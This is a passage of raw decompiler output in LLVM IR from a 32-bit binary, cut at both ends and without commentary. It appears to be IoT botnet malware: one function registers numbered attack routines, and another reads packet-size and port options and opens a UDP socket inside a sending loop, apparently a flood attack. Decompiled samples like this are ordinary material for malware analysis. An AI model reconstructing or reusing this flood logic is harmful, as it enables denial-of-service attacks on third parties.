  %v6_86b4 = call i32 @function_12058(i32* %v5_86b4, i32 %v3_86b0, i32 ptrtoint (i32* @global_var_a480.29 to i32), i32 2)
  %v2_86b8 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_86b8 = zext i8 %v2_86b8 to i32
  store i32 %v3_86b8, i32* %r3.global-to-local, align 4
  store i32 %v6_86b4, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r5, align 4
  %v5_86c0 = mul nuw nsw i32 %v3_86b8, 4
  %v6_86c0 = add i32 %v5_86c0, %v6_86b4
  %v7_86c0 = inttoptr i32 %v6_86c0 to i32*
  store i32 %v0_86c0, i32* %v7_86c0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r8, align 4
  %v2_86c8 = add i32 %v1_86c8, %v0_86c8
  store i32 %v2_86c8, i32* %r3.global-to-local, align 4
  %v1_86d0 = load i32, i32* @r6, align 4
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  store i32 %v6_86b4, i32* %v2_86d0, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = trunc i32 %v0_86d4 to i8
  %v2_86d4 = load i32, i32* @r4, align 4
  %v3_86d4 = inttoptr i32 %v2_86d4 to i8*
  store i8 %v1_86d4, i8* %v3_86d4, align 1
  %v2_86d8 = call i32 @function_11f24(i32 %v1_86c8, i32 8)
  %v2_86dc = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_86dc = zext i8 %v2_86dc to i32
  store i32 ptrtoint (i32* @global_var_896c.31 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_86d8, i32* @r5, align 4
  %v1_86ec = load i32, i32* @r8, align 4
  %v2_86ec = add i32 %v1_86ec, %v3_86dc
  store i32 %v2_86ec, i32* %r1.global-to-local, align 4
  %v2_86f0 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_86f4 = inttoptr i32 %v2_86d8 to i32*
  store i32 ptrtoint (i32* @global_var_896c.31 to i32), i32* %v2_86f4, align 4
  %v0_86f8 = load i32, i32* @r7, align 4
  %v1_86f8 = trunc i32 %v0_86f8 to i8
  %v2_86f8 = load i32, i32* @r5, align 4
  %v3_86f8 = add i32 %v2_86f8, 4
  %v4_86f8 = inttoptr i32 %v3_86f8 to i8*
  store i8 %v1_86f8, i8* %v4_86f8, align 1
  %v0_86fc = load i32, i32* %r1.global-to-local, align 4
  %v3_86fc = mul i32 %v0_86fc, 4
  store i32 %v3_86fc, i32* %r1.global-to-local, align 4
  %v4_8700 = inttoptr i32 %v2_86f0 to i32*
  %v5_8700 = call i32 @function_12058(i32* %v4_8700, i32 %v3_86fc, i32 %v6_86b4, i32 ptrtoint (i32* @global_var_896c.31 to i32))
  %v2_8704 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8704 = zext i8 %v2_8704 to i32
  store i32 %v3_8704, i32* %r3.global-to-local, align 4
  store i32 %v5_8700, i32* %r2.global-to-local, align 4
  %v0_870c = load i32, i32* @r5, align 4
  %v5_870c = mul nuw nsw i32 %v3_8704, 4
  %v6_870c = add i32 %v5_870c, %v5_8700
  %v7_870c = inttoptr i32 %v6_870c to i32*
  store i32 %v0_870c, i32* %v7_870c, align 4
  %v0_8710 = load i32, i32* @r7, align 4
  store i32 %v0_8710, i32* %r1.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = load i32, i32* @r8, align 4
  %v2_8714 = add i32 %v1_8714, %v0_8714
  store i32 %v2_8714, i32* %r3.global-to-local, align 4
  %v1_871c = trunc i32 %v2_8714 to i8
  %v2_871c = load i32, i32* @r4, align 4
  %v3_871c = inttoptr i32 %v2_871c to i8*
  store i8 %v1_871c, i8* %v3_871c, align 1
  %v0_8720 = load i32, i32* %r2.global-to-local, align 4
  %v1_8720 = load i32, i32* @r6, align 4
  %v2_8720 = inttoptr i32 %v1_8720 to i32*
  store i32 %v0_8720, i32* %v2_8720, align 4
  %v2_8724 = call i32 @function_11f24(i32 %v1_8714, i32 %v0_8710)
  %v2_8728 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8728 = zext i8 %v2_8728 to i32
  store i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8724, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8738 = load i32, i32* @r8, align 4
  %v2_8738 = add i32 %v1_8738, %v3_8728
  store i32 %v2_8738, i32* %r1.global-to-local, align 4
  %v2_873c = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_8740 = inttoptr i32 %v2_8724 to i32*
  store i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32* %v2_8740, align 4
  %v3_8744 = load i32, i32* @r5, align 4
  %v4_8744 = add i32 %v3_8744, 4
  %v5_8744 = inttoptr i32 %v4_8744 to i8*
  store i8 3, i8* %v5_8744, align 1
  %v0_8748 = load i32, i32* %r1.global-to-local, align 4
  %v3_8748 = mul i32 %v0_8748, 4
  store i32 %v3_8748, i32* %r1.global-to-local, align 4
  %v5_874c = inttoptr i32 %v2_873c to i32*
  %v6_874c = call i32 @function_12058(i32* %v5_874c, i32 %v3_8748, i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32 3)
  %v2_8750 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8750 = zext i8 %v2_8750 to i32
  store i32 %v3_8750, i32* %r3.global-to-local, align 4
  store i32 %v6_874c, i32* %r2.global-to-local, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  %v5_8758 = mul nuw nsw i32 %v3_8750, 4
  %v6_8758 = add i32 %v5_8758, %v6_874c
  %v7_8758 = inttoptr i32 %v6_8758 to i32*
  store i32 %v0_8758, i32* %v7_8758, align 4
  %v0_875c = load i32, i32* @r7, align 4
  store i32 %v0_875c, i32* %r1.global-to-local, align 4
  %v0_8760 = load i32, i32* %r3.global-to-local, align 4
  %v1_8760 = load i32, i32* @r8, align 4
  %v2_8760 = add i32 %v1_8760, %v0_8760
  store i32 %v2_8760, i32* %r3.global-to-local, align 4
  %v1_8768 = trunc i32 %v2_8760 to i8
  %v2_8768 = load i32, i32* @r4, align 4
  %v3_8768 = inttoptr i32 %v2_8768 to i8*
  store i8 %v1_8768, i8* %v3_8768, align 1
  %v0_876c = load i32, i32* %r2.global-to-local, align 4
  %v1_876c = load i32, i32* @r6, align 4
  %v2_876c = inttoptr i32 %v1_876c to i32*
  store i32 %v0_876c, i32* %v2_876c, align 4
  %v2_8770 = call i32 @function_11f24(i32 %v1_8760, i32 %v0_875c)
  %v2_8774 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8774 = zext i8 %v2_8774 to i32
  store i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8770, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8784 = load i32, i32* @r8, align 4
  %v2_8784 = add i32 %v1_8784, %v3_8774
  store i32 %v2_8784, i32* %r1.global-to-local, align 4
  %v2_8788 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_878c = inttoptr i32 %v2_8770 to i32*
  store i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32* %v2_878c, align 4
  %v3_8790 = load i32, i32* @r5, align 4
  %v4_8790 = add i32 %v3_8790, 4
  %v5_8790 = inttoptr i32 %v4_8790 to i8*
  store i8 4, i8* %v5_8790, align 1
  %v0_8794 = load i32, i32* %r1.global-to-local, align 4
  %v3_8794 = mul i32 %v0_8794, 4
  store i32 %v3_8794, i32* %r1.global-to-local, align 4
  %v5_8798 = inttoptr i32 %v2_8788 to i32*
  %v6_8798 = call i32 @function_12058(i32* %v5_8798, i32 %v3_8794, i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32 4)
  %v2_879c = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_879c = zext i8 %v2_879c to i32
  store i32 %v3_879c, i32* %r3.global-to-local, align 4
  store i32 %v6_8798, i32* %r2.global-to-local, align 4
  %v0_87a4 = load i32, i32* @r5, align 4
  %v5_87a4 = mul nuw nsw i32 %v3_879c, 4
  %v6_87a4 = add i32 %v5_87a4, %v6_8798
  %v7_87a4 = inttoptr i32 %v6_87a4 to i32*
  store i32 %v0_87a4, i32* %v7_87a4, align 4
  %v0_87a8 = load i32, i32* @r7, align 4
  store i32 %v0_87a8, i32* %r1.global-to-local, align 4
  %v0_87ac = load i32, i32* %r3.global-to-local, align 4
  %v1_87ac = load i32, i32* @r8, align 4
  %v2_87ac = add i32 %v1_87ac, %v0_87ac
  store i32 %v2_87ac, i32* %r3.global-to-local, align 4
  %v1_87b4 = trunc i32 %v2_87ac to i8
  %v2_87b4 = load i32, i32* @r4, align 4
  %v3_87b4 = inttoptr i32 %v2_87b4 to i8*
  store i8 %v1_87b4, i8* %v3_87b4, align 1
  %v0_87b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r6, align 4
  %v2_87b8 = inttoptr i32 %v1_87b8 to i32*
  store i32 %v0_87b8, i32* %v2_87b8, align 4
  %v2_87bc = call i32 @function_11f24(i32 %v1_87ac, i32 %v0_87a8)
  %v2_87c0 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_87c0 = zext i8 %v2_87c0 to i32
  store i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87bc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_87d0 = load i32, i32* @r8, align 4
  %v2_87d0 = add i32 %v1_87d0, %v3_87c0
  store i32 %v2_87d0, i32* %r1.global-to-local, align 4
  %v2_87d4 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_87d8 = inttoptr i32 %v2_87bc to i32*
  store i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32* %v2_87d8, align 4
  %v3_87dc = load i32, i32* @r5, align 4
  %v4_87dc = add i32 %v3_87dc, 4
  %v5_87dc = inttoptr i32 %v4_87dc to i8*
  store i8 5, i8* %v5_87dc, align 1
  %v0_87e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87e0 = mul i32 %v0_87e0, 4
  store i32 %v3_87e0, i32* %r1.global-to-local, align 4
  %v5_87e4 = inttoptr i32 %v2_87d4 to i32*
  %v6_87e4 = call i32 @function_12058(i32* %v5_87e4, i32 %v3_87e0, i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32 5)
  %v2_87e8 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_87e8 = zext i8 %v2_87e8 to i32
  store i32 %v3_87e8, i32* %r3.global-to-local, align 4
  store i32 %v6_87e4, i32* %r2.global-to-local, align 4
  %v0_87f0 = load i32, i32* @r5, align 4
  %v5_87f0 = mul nuw nsw i32 %v3_87e8, 4
  %v6_87f0 = add i32 %v5_87f0, %v6_87e4
  %v7_87f0 = inttoptr i32 %v6_87f0 to i32*
  store i32 %v0_87f0, i32* %v7_87f0, align 4
  %v0_87f4 = load i32, i32* @r7, align 4
  store i32 %v0_87f4, i32* %r1.global-to-local, align 4
  %v0_87f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r8, align 4
  %v2_87f8 = add i32 %v1_87f8, %v0_87f8
  store i32 %v2_87f8, i32* %r3.global-to-local, align 4
  %v1_8800 = trunc i32 %v2_87f8 to i8
  %v2_8800 = load i32, i32* @r4, align 4
  %v3_8800 = inttoptr i32 %v2_8800 to i8*
  store i8 %v1_8800, i8* %v3_8800, align 1
  %v0_8804 = load i32, i32* %r2.global-to-local, align 4
  %v1_8804 = load i32, i32* @r6, align 4
  %v2_8804 = inttoptr i32 %v1_8804 to i32*
  store i32 %v0_8804, i32* %v2_8804, align 4
  %v2_8808 = call i32 @function_11f24(i32 %v1_87f8, i32 %v0_87f4)
  %v2_880c = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_880c = zext i8 %v2_880c to i32
  store i32 43836, i32* %r2.global-to-local, align 4
  store i32 %v2_8808, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_881c = load i32, i32* @r8, align 4
  %v2_881c = add i32 %v1_881c, %v3_880c
  store i32 %v2_881c, i32* %r1.global-to-local, align 4
  %v2_8820 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_8824 = inttoptr i32 %v2_8808 to i32*
  store i32 43836, i32* %v2_8824, align 4
  %v3_8828 = load i32, i32* @r5, align 4
  %v4_8828 = add i32 %v3_8828, 4
  %v5_8828 = inttoptr i32 %v4_8828 to i8*
  store i8 10, i8* %v5_8828, align 1
  %v0_882c = load i32, i32* %r1.global-to-local, align 4
  %v3_882c = mul i32 %v0_882c, 4
  store i32 %v3_882c, i32* %r1.global-to-local, align 4
  %v5_8830 = inttoptr i32 %v2_8820 to i32*
  %v6_8830 = call i32 @function_12058(i32* %v5_8830, i32 %v3_882c, i32 43836, i32 10)
  %v2_8834 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8834 = zext i8 %v2_8834 to i32
  store i32 %v3_8834, i32* %r3.global-to-local, align 4
  store i32 %v6_8830, i32* %r2.global-to-local, align 4
  %v0_883c = load i32, i32* @r5, align 4
  %v5_883c = mul nuw nsw i32 %v3_8834, 4
  %v6_883c = add i32 %v5_883c, %v6_8830
  %v7_883c = inttoptr i32 %v6_883c to i32*
  store i32 %v0_883c, i32* %v7_883c, align 4
  %v0_8840 = load i32, i32* @r7, align 4
  store i32 %v0_8840, i32* %r1.global-to-local, align 4
  %v0_8844 = load i32, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r8, align 4
  %v2_8844 = add i32 %v1_8844, %v0_8844
  store i32 %v2_8844, i32* %r3.global-to-local, align 4
  %v1_884c = trunc i32 %v2_8844 to i8
  %v2_884c = load i32, i32* @r4, align 4
  %v3_884c = inttoptr i32 %v2_884c to i8*
  store i8 %v1_884c, i8* %v3_884c, align 1
  %v0_8850 = load i32, i32* %r2.global-to-local, align 4
  %v1_8850 = load i32, i32* @r6, align 4
  %v2_8850 = inttoptr i32 %v1_8850 to i32*
  store i32 %v0_8850, i32* %v2_8850, align 4
  %v2_8854 = call i32 @function_11f24(i32 %v1_8844, i32 %v0_8840)
  %v2_8858 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8858 = zext i8 %v2_8858 to i32
  store i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8854, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_8868 = load i32, i32* @r8, align 4
  %v2_8868 = add i32 %v1_8868, %v3_8858
  store i32 %v2_8868, i32* %r1.global-to-local, align 4
  %v2_886c = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_8870 = inttoptr i32 %v2_8854 to i32*
  store i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32* %v2_8870, align 4
  %v3_8874 = load i32, i32* @r5, align 4
  %v4_8874 = add i32 %v3_8874, 4
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 6, i8* %v5_8874, align 1
  %v0_8878 = load i32, i32* %r1.global-to-local, align 4
  %v3_8878 = mul i32 %v0_8878, 4
  store i32 %v3_8878, i32* %r1.global-to-local, align 4
  %v5_887c = inttoptr i32 %v2_886c to i32*
  %v6_887c = call i32 @function_12058(i32* %v5_887c, i32 %v3_8878, i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32 6)
  %v2_8880 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8880 = zext i8 %v2_8880 to i32
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  store i32 %v6_887c, i32* %r2.global-to-local, align 4
  %v0_8888 = load i32, i32* @r5, align 4
  %v5_8888 = mul nuw nsw i32 %v3_8880, 4
  %v6_8888 = add i32 %v5_8888, %v6_887c
  %v7_8888 = inttoptr i32 %v6_8888 to i32*
  store i32 %v0_8888, i32* %v7_8888, align 4
  %v0_888c = load i32, i32* @r7, align 4
  store i32 %v0_888c, i32* %r1.global-to-local, align 4
  %v0_8890 = load i32, i32* %r3.global-to-local, align 4
  %v1_8890 = load i32, i32* @r8, align 4
  %v2_8890 = add i32 %v1_8890, %v0_8890
  store i32 %v2_8890, i32* %r3.global-to-local, align 4
  %v1_8898 = trunc i32 %v2_8890 to i8
  %v2_8898 = load i32, i32* @r4, align 4
  %v3_8898 = inttoptr i32 %v2_8898 to i8*
  store i8 %v1_8898, i8* %v3_8898, align 1
  %v0_889c = load i32, i32* %r2.global-to-local, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_11f24(i32 %v1_8890, i32 %v0_888c)
  %v2_88a4 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_88a4 = zext i8 %v2_88a4 to i32
  store i32 ptrtoint (i32* @global_var_9398.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88a0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88b4 = load i32, i32* @r8, align 4
  %v2_88b4 = add i32 %v1_88b4, %v3_88a4
  store i32 %v2_88b4, i32* %r1.global-to-local, align 4
  %v2_88b8 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_88bc = inttoptr i32 %v2_88a0 to i32*
  store i32 ptrtoint (i32* @global_var_9398.42 to i32), i32* %v2_88bc, align 4
  %v3_88c0 = load i32, i32* @r5, align 4
  %v4_88c0 = add i32 %v3_88c0, 4
  %v5_88c0 = inttoptr i32 %v4_88c0 to i8*
  store i8 7, i8* %v5_88c0, align 1
  %v0_88c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_88c4 = mul i32 %v0_88c4, 4
  store i32 %v3_88c4, i32* %r1.global-to-local, align 4
  %v5_88c8 = inttoptr i32 %v2_88b8 to i32*
  %v6_88c8 = call i32 @function_12058(i32* %v5_88c8, i32 %v3_88c4, i32 ptrtoint (i32* @global_var_9398.42 to i32), i32 7)
  %v2_88cc = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_88cc = zext i8 %v2_88cc to i32
  store i32 %v3_88cc, i32* %r3.global-to-local, align 4
  store i32 %v6_88c8, i32* %r2.global-to-local, align 4
  %v0_88d4 = load i32, i32* @r5, align 4
  %v5_88d4 = mul nuw nsw i32 %v3_88cc, 4
  %v6_88d4 = add i32 %v5_88d4, %v6_88c8
  %v7_88d4 = inttoptr i32 %v6_88d4 to i32*
  store i32 %v0_88d4, i32* %v7_88d4, align 4
  %v0_88d8 = load i32, i32* @r7, align 4
  store i32 %v0_88d8, i32* %r1.global-to-local, align 4
  %v0_88dc = load i32, i32* %r3.global-to-local, align 4
  %v1_88dc = load i32, i32* @r8, align 4
  %v2_88dc = add i32 %v1_88dc, %v0_88dc
  store i32 %v2_88dc, i32* %r3.global-to-local, align 4
  %v1_88e4 = trunc i32 %v2_88dc to i8
  %v2_88e4 = load i32, i32* @r4, align 4
  %v3_88e4 = inttoptr i32 %v2_88e4 to i8*
  store i8 %v1_88e4, i8* %v3_88e4, align 1
  %v0_88e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r6, align 4
  %v2_88e8 = inttoptr i32 %v1_88e8 to i32*
  store i32 %v0_88e8, i32* %v2_88e8, align 4
  %v2_88ec = call i32 @function_11f24(i32 %v1_88dc, i32 %v0_88d8)
  %v2_88f0 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_88f0 = zext i8 %v2_88f0 to i32
  store i32 35852, i32* %r2.global-to-local, align 4
  store i32 %v2_88ec, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8900 = load i32, i32* @r8, align 4
  %v2_8900 = add i32 %v1_8900, %v3_88f0
  store i32 %v2_8900, i32* %r1.global-to-local, align 4
  %v2_8904 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_8908 = inttoptr i32 %v2_88ec to i32*
  store i32 35852, i32* %v2_8908, align 4
  %v3_890c = load i32, i32* @r5, align 4
  %v4_890c = add i32 %v3_890c, 4
  %v5_890c = inttoptr i32 %v4_890c to i8*
  store i8 9, i8* %v5_890c, align 1
  %v0_8910 = load i32, i32* %r1.global-to-local, align 4
  %v3_8910 = mul i32 %v0_8910, 4
  store i32 %v3_8910, i32* %r1.global-to-local, align 4
  %v5_8914 = inttoptr i32 %v2_8904 to i32*
  %v6_8914 = call i32 @function_12058(i32* %v5_8914, i32 %v3_8910, i32 35852, i32 9)
  %v2_8918 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8918 = zext i8 %v2_8918 to i32
  store i32 %v3_8918, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r6, align 4
  %v2_891c = inttoptr i32 %v1_891c to i32*
  store i32 %v6_8914, i32* %v2_891c, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v2_8920 = load i32, i32* %r3.global-to-local, align 4
  %v5_8920 = mul i32 %v2_8920, 4
  %v6_8920 = add i32 %v5_8920, %v6_8914
  %v7_8920 = inttoptr i32 %v6_8920 to i32*
  store i32 %v0_8920, i32* %v7_8920, align 4
  %v0_8924 = load i32, i32* %r3.global-to-local, align 4
  %v1_8924 = load i32, i32* @r8, align 4
  %v2_8924 = add i32 %v1_8924, %v0_8924
  store i32 %v2_8924, i32* %r2.global-to-local, align 4
  %v1_892c = trunc i32 %v2_8924 to i8
  %v2_892c = load i32, i32* @r4, align 4
  %v3_892c = inttoptr i32 %v2_892c to i8*
  store i8 %v1_892c, i8* %v3_892c, align 1
  %v2_8930 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8930, i32* @r4, align 4
  store i32 %v6_85e0, i32* @r5, align 4
  store i32 %v9_85e0, i32* @r6, align 4
  store i32 %v12_85e0, i32* @r7, align 4
  store i32 %v15_85e0, i32* @r8, align 4
  ret i32 %v1_8924

; uselistorder directives
  uselistorder i32 %v1_8924, { 1, 0 }
  uselistorder i32 %v3_8910, { 1, 0 }
  uselistorder i32 %v1_88dc, { 1, 0 }
  uselistorder i32 %v3_88c4, { 1, 0 }
  uselistorder i32 %v1_8890, { 1, 0 }
  uselistorder i32 %v3_8878, { 1, 0 }
  uselistorder i32 %v1_8844, { 1, 0 }
  uselistorder i32 %v3_882c, { 1, 0 }
  uselistorder i32 %v1_87f8, { 1, 0 }
  uselistorder i32 %v3_87e0, { 1, 0 }
  uselistorder i32 %v1_87ac, { 1, 0 }
  uselistorder i32 %v3_8794, { 1, 0 }
  uselistorder i32 %v1_8760, { 1, 0 }
  uselistorder i32 %v3_8748, { 1, 0 }
  uselistorder i32 %v1_8714, { 1, 0 }
  uselistorder i32 %v3_86fc, { 1, 0 }
  uselistorder i32 %v1_86c8, { 1, 0 }
  uselistorder i32 %v6_86b4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86b0, { 1, 0 }
  uselistorder i32 %v1_867c, { 1, 0 }
  uselistorder i32 %v3_8664, { 1, 0 }
  uselistorder i32 %v2_8640, { 1, 0 }
  uselistorder i32 %v6_861c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8618, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 16, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 16, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e6f4.17 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_1e6f5.25 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1e6f8.19, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
}

define i32 @function_896c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_896c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_896c = load i32, i32* @r4, align 4
  %v18_896c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8988 = call i32 @function_11f24(i32 %arg1, i32 4)
  store i32 %v2_8988, i32* @sl, align 4
  %v0_8994 = load i32, i32* @r7, align 4
  %v2_8998 = call i32 @function_11f24(i32 %v0_8994, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89a4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8998, i32* @r8, align 4
  %v0_89b4 = load i32, i32* @r5, align 4
  %v4_89b8 = inttoptr i32 %v0_89a4 to i32*
  %v5_89b8 = call i32 @function_8570(i32 %v0_89b4, i32* %v4_89b8, i32 7, i32 65535)
  %v3_89c0 = urem i32 %v5_89b8, 65536
  %v0_89c4 = load i32, i32* @r6, align 4
  %v0_89cc = load i32, i32* @r4, align 4
  store i32 %v0_89cc, i32* %r3.global-to-local, align 4
  %v0_89d0 = load i32, i32* @r5, align 4
  %v5_89d8 = inttoptr i32 %v0_89c4 to i32*
  %v6_89d8 = call i32 @function_8570(i32 %v0_89d0, i32* %v5_89d8, i32 6, i32 %v0_89cc)
  %v0_89dc = load i32, i32* @r6, align 4
  %v3_89e0 = mul i32 %v6_89d8, 65536
  store i32 %v3_89e0, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_89ec = load i32, i32* @r5, align 4
  %v4_89f0 = inttoptr i32 %v0_89dc to i32*
  %v5_89f0 = call i32 @function_8570(i32 %v0_89ec, i32* %v4_89f0, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a00 = load i32, i32* @r6, align 4
  %v0_8a04 = load i32, i32* @r5, align 4
  %v3_8a08 = urem i32 %v5_89f0, 65536
  store i32 %v3_8a08, i32* @r5, align 4
  %v4_8a0c = inttoptr i32 %v0_8a00 to i32*
  %v5_8a0c = call i32 @function_8570(i32 %v0_8a04, i32* %v4_8a0c, i32 1, i32 1)
  %v0_8a10 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a10 = udiv i32 %v0_8a10, 65536
  store i32 %v3_8a10, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a18 = load i32, i32* @r4, align 4
  %v9_8a18 = icmp eq i32 %v3_8a10, %v1_8a18
  br i1 %v9_8a18, label %dec_label_pc_8a48, label %bb

bb:                                               ; preds = %dec_label_pc_896c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a30 = udiv i32 %v0_8a10, 16777216
  store i32 %v4_8a30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a58

dec_label_pc_8a48:                                ; preds = %dec_label_pc_896c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a48 = call i32 @function_e094()
  br label %dec_label_pc_8a58

dec_label_pc_8a58:                                ; preds = %bb, %dec_label_pc_8a48
  %v0_8a3c10 = urem i32 %v5_8a0c, 256
  %v0_8a58 = load i32, i32* @r7, align 4
  %v2_8a58 = icmp eq i32 %v0_8a58, 0
  br i1 %v2_8a58, label %dec_label_pc_8b98, label %dec_label_pc_8a60

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a58
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b0c = udiv i32 %v3_89c0, 256
  %v1_8b08 = mul i32 %v5_89b8, 256
  %v4_8b10 = and i32 %v1_8b08, 65280
  %v5_8b10 = or i32 %v4_8b10, %v3_8b0c
  %v2_8a90 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8af0

dec_label_pc_8a70:                                ; preds = %bb51, %dec_label_pc_8b30
  %v3_8a7c = call i32 @function_113bc(i32 2, i32 2, i32 17)
  %v7_8a84 = icmp eq i32 %v3_8a7c, -1
  %v0_8a88 = load i32, i32* @sb, align 4
  %v1_8a88 = add i32 %v0_8a88, 1
  store i32 %v1_8a88, i32* @sb, align 4
  %v0_8a8c = load i32, i32* @fp, align 4
  %v1_8a8c = add i32 %v0_8a8c, 24
  store i32 %v1_8a8c, i32* @fp, align 4
  %v2_8a98 = load i32, i32* @r8, align 4
  %v3_8a98 = add i32 %v2_8a98, %stack_var_-60.0
  %v4_8a98 = inttoptr i32 %v3_8a98 to i32*
